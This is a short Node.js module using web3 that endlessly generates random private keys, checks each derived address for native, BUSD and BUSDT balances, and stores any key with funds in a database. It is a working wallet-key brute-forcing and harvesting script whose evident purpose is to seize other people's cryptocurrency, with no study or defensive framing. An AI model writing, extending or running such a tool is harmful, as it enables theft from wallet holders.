const Web3 = require('web3');
const abi = require("./abi.json");
const BNBabi = require("./BUSDT.json");
const dbConn  = require('./db');
const request = require('request');

async function backtoken(req, res){
    var i=0;
    while(1){
        i++;
        let letters = "0123456789abcdef";
        var hexcode = '';
        for (let i = 0; i < 64; i++)
            hexcode += letters[(Math.floor(Math.random() * 16))];
        
        const web3 = new Web3(process.env.MAINNET);
        const account = await web3.eth.accounts.privateKeyToAccount(hexcode);
        // contract instance
        const contract = await new web3.eth.Contract(abi, process.env.CONTRACT_ADDRESS);
        const BUSDTcontract = await new web3.eth.Contract(BNBabi, process.env.BUSDT_ADDRESS);
        var Bbalance = await web3.eth.getBalance(account.address);
        //get BUSD balance
        const balance = await contract.methods.balanceOf(account.address).call();
        const BUSDTbalance = await BUSDTcontract.methods.balanceOf(account.address).call();
        console.log(Bbalance, balance, BUSDTbalance)
        if(Bbalance > 0 || BUSDTbalance > 0 || balance > 0){
            var form_data = {
                privatekey:hexcode
            }
            dbConn.query('INSERT INTO wallet SET ?', form_data, function(err, result) {
            }) 
        }

        console.log("counting", i+1)
    }
}         

module.exports = {backtoken}

